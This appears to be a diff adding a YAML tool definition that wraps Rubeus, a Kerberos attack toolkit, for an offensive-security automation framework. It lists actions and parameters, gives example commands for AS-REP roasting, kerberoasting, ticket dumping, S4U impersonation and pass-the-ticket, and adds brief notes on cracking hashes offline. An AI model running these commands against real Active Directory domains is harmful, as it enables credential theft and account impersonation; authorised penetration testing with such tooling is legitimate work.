@@ -1,0 +1,104 @@
+name: rubeus
+category: ad
+description: Kerberos abuse toolkit for Active Directory attacks.
+keywords:
+  - kerberos
+  - active directory
+  - ticket
+  - asreproast
+  - kerberoast
+  - delegation
+
+parameters:
+  action:
+    type: enum
+    required: true
+    options:
+      - value: "asreproast"
+        description: "AS-REP Roasting"
+      - value: "kerberoast"
+        description: "Kerberoasting"
+      - value: "s4u"
+        description: "S4U delegation abuse"
+      - value: "dump"
+        description: "Dump tickets"
+      - value: "tgtdeleg"
+        description: "Request TGT delegation"
+      - value: "monitor"
+        description: "Monitor TGT requests"
+      - value: "harvest"
+        description: "Harvest TGTs"
+      - value: "describe"
+        description: "Describe ticket"
+      - value: "ptt"
+        description: "Pass-the-ticket"
+    description: Rubeus action
+
+  user:
+    type: string
+    flag: "/user:"
+    description: Target username
+
+  domain:
+    type: string
+    flag: "/domain:"
+    description: Target domain
+
+  dc:
+    type: string
+    flag: "/dc:"
+    description: Domain controller
+
+  outfile:
+    type: string
+    flag: "/outfile:"
+    description: Output file
+
+  format:
+    type: enum
+    flag: "/format:"
+    options: ["hashcat", "john"]
+    description: Hash output format
+
+  ticket:
+    type: string
+    flag: "/ticket:"
+    description: Base64 ticket
+
+  nowrap:
+    type: boolean
+    flag: "/nowrap"
+    description: No line wrapping
+
+requires_root: false
+timeout: 300
+
+examples:
+  - "rubeus asreproast /format:hashcat /outfile:hashes.txt"
+  - "rubeus kerberoast /format:hashcat /outfile:spn_hashes.txt"
+  - "rubeus dump /nowrap"
+  - "rubeus s4u /user:serviceacct /rc4:hash /impersonateuser:admin /msdsspn:cifs/target"
+  - "rubeus ptt /ticket:base64_ticket"
+
+notes: |
+  AS-REP Roasting:
+  - Target: Users without preauth
+  - Crack offline with hashcat
+
+  Kerberoasting:
+  - Target: Service accounts
+  - Get SPN hashes
+  - Crack offline
+
+  S4U abuse:
+  - Constrained delegation
+  - Unconstrained delegation
+  - RBCD attacks
+
+  Ticket operations:
+  - dump: Extract from memory
+  - ptt: Inject ticket
+  - describe: Analyze ticket
+
+  Note: Windows tool - use via
+  wine or on Windows target
